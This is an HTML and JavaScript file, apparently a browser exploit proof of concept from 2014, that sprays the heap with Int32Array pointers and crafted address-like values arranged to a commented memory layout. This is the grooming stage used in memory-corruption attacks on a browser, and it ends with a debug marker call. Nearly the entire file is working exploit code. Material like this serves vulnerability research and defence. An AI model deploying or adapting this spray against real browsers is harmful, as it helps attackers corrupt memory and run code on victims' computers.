<!--
 Author: Chen Zhang (@demi6od) <demi6d@gmail.com>
 Date: 2014 May 23rd
-->

<html>
    <script>
        function dword2Int(data) {
            return data >> 1;
        }

        function arrSpray() {
            // Create arrBuf at address 0 with length 0, and all int32Array point to this array buffer.
            arrBuf = new ArrayBuffer(0);

            /* Spray memory layout 
               ------------------------
               |  LargeHeapBlockEntry |
               ------------------------
               |  ArrayDataHead       |
               ------------------------
               |  TypedArray pointer  |
               |  TypedArray pointer  |
               |  TypedArray pointer  |
               |  ...                 |
               |  (number << 2) + 1   |
               |  (number << 2) + 1   |
               |  (number << 2) + 1   |
               |  ...                 |
               ------------------------
               |  TypedArray          |
               |                      |
               |                      |
               ------------------------
               |  TypedArray          |
               |                      |
               |                      |
               ------------------------
               |  TypedArray          |
               |                      |
               |                      |
               ------------------------
               |  ...                 |
               ------------------------
            */ 
            heapArr = [];
            arrNum = 0x400;
            for (var i = 0; i < arrNum; i++) {
                heapArr[i] = new Array(0x3bf8);

                // TypedArray pointer
                for(var j = 0; j < 0x55; j++) {
                    heapArr[i][j] = new Int32Array(arrBuf);				 
                }

                // Odd number
                for (var j = 0x80; j < 0x3bf8; j += 0x40) {
                    heapArr[i][j + 0x0] = dword2Int(0x41410001);
                    heapArr[i][j + 0x1] = dword2Int(0x41410011);
                    heapArr[i][j + 0x2] = dword2Int(0x41410021);
                    heapArr[i][j + 0x3] = dword2Int(0x41410031);
                    heapArr[i][j + 0x4] = dword2Int(0x41410041);
                    heapArr[i][j + 0x5] = dword2Int(0x41410051);
                    heapArr[i][j + 0x6] = dword2Int(0x41410061);
                    heapArr[i][j + 0x7] = dword2Int(0x3d0d619d);
                    heapArr[i][j + 0x8] = dword2Int(0x41410081);
                    heapArr[i][j + 0x9] = dword2Int(0x1dff5e91); 
                    heapArr[i][j + 0xa] = dword2Int(0x4141000d);
                    heapArr[i][j + 0xb] = dword2Int(0x1dff19b1);
                    heapArr[i][j + 0xc] = dword2Int(0x0d0d610d);
                    heapArr[i][j + 0xd] = dword2Int(0x414100d1);
                    heapArr[i][j + 0xe] = dword2Int(0x414100e1);
                    heapArr[i][j + 0xf] = dword2Int(0x414100f1);

                    heapArr[i][j + 0x10] = dword2Int(0x41410101);
                    heapArr[i][j + 0x11] = dword2Int(0x41410111);
                    heapArr[i][j + 0x12] = dword2Int(0x41410121);
                    heapArr[i][j + 0x13] = dword2Int(0x41410131);
                    heapArr[i][j + 0x14] = dword2Int(0x41410141);
                    heapArr[i][j + 0x15] = dword2Int(0x41410151);
                    heapArr[i][j + 0x16] = dword2Int(0x41410161);
                    heapArr[i][j + 0x17] = dword2Int(0x41410171);
                    heapArr[i][j + 0x18] = dword2Int(0x41410181);
                    heapArr[i][j + 0x19] = dword2Int(0x41410191);
                    heapArr[i][j + 0x1a] = dword2Int(0x414101a1);
                    heapArr[i][j + 0x1b] = dword2Int(0x414101b1);
                    heapArr[i][j + 0x1c] = dword2Int(0x414101c1);
                    heapArr[i][j + 0x1d] = dword2Int(0x0d5e4cd1);
                    heapArr[i][j + 0x1e] = dword2Int(0x4141010d);
                    heapArr[i][j + 0x1f] = dword2Int(0x0d6188f1);

                    heapArr[i][j + 0x20] = dword2Int(0x4141020d);
                    heapArr[i][j + 0x21] = dword2Int(0x1dff1911);
                    heapArr[i][j + 0x22] = dword2Int(0x4141020d);
                    heapArr[i][j + 0x23] = dword2Int(0x41410231);
                    heapArr[i][j + 0x24] = dword2Int(0x41410241);
                    heapArr[i][j + 0x25] = dword2Int(0x0d0d61ad);
                    heapArr[i][j + 0x26] = dword2Int(0x0d0d61a1);
                    heapArr[i][j + 0x27] = dword2Int(0x41410271);
                    heapArr[i][j + 0x28] = dword2Int(0x41410281);
                    heapArr[i][j + 0x29] = dword2Int(0x41410291);
                    heapArr[i][j + 0x2a] = dword2Int(0x414102a1);
                    heapArr[i][j + 0x2b] = dword2Int(0x414102b1);
                    heapArr[i][j + 0x2c] = dword2Int(0x414102c1);
                    heapArr[i][j + 0x2d] = dword2Int(0x414102d1);
                    heapArr[i][j + 0x2e] = dword2Int(0x414102e1);
                    heapArr[i][j + 0x2f] = dword2Int(0x414102f1);

                    heapArr[i][j + 0x30] = dword2Int(0x41410301);
                    heapArr[i][j + 0x31] = dword2Int(0x41410311);
                    heapArr[i][j + 0x32] = dword2Int(0x41410321);
                    heapArr[i][j + 0x33] = dword2Int(0x41410331);
                    heapArr[i][j + 0x34] = dword2Int(0x41410341);
                    heapArr[i][j + 0x35] = dword2Int(0x41410351);
                    heapArr[i][j + 0x36] = dword2Int(0x41410361);
                    heapArr[i][j + 0x37] = dword2Int(0x41410371);

                    if (j != 0x3bc0) {
                        heapArr[i][j + 0x38] = dword2Int(0x41410381);
                        heapArr[i][j + 0x39] = dword2Int(0x41410391);
                        heapArr[i][j + 0x3a] = dword2Int(0x0d0df180);
                        heapArr[i][j + 0x3b] = dword2Int(0x414103b1);
                        heapArr[i][j + 0x3c] = dword2Int(0x0d5e4cc1);
                        heapArr[i][j + 0x3d] = dword2Int(0x4141030d);
                        heapArr[i][j + 0x3e] = dword2Int(0x414103e1);
                        heapArr[i][j + 0x3f] = dword2Int(0x414103f1);
                    }
                }

                // Array start and end tag
                heapArr[i][0x80] = dword2Int(0xadc0dd);
                heapArr[i][0x3bf7] = dword2Int(0xadc0dd);
            }
        }

        arrSpray();

        Math.atan2(0xbabe, "[*] For debug....");
    </script>
</html>
